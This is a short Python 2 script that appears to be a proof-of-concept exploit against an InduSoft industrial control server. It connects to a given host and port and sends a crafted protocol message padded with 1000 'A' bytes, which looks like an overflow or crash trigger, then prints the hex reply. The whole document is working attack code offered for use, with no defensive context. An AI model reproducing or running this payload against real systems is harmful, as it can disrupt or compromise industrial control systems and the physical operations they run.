import socket, argparse, binascii
from struct import *

parser = argparse.ArgumentParser()
parser.add_argument("target_host", help="InduSoft host") 
parser.add_argument("target_port", help="InduSoft port (ie. 1234)", type=int) 
args = parser.parse_args()
  
host = args.target_host
port = args.target_port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))

data =  '\x02\x31\x10\x31'
data += '\x10\x38\x10\x32'
data += '\x10\x32\x03\x02'
data += '\x51\xff\xff\xff'
data += '\xff\xff\xff\xff'
data += 'A' * 1000            # 
data += '\x03'                # 

s.send(data)
res = s.recv(1024)
print binascii.hexlify(res)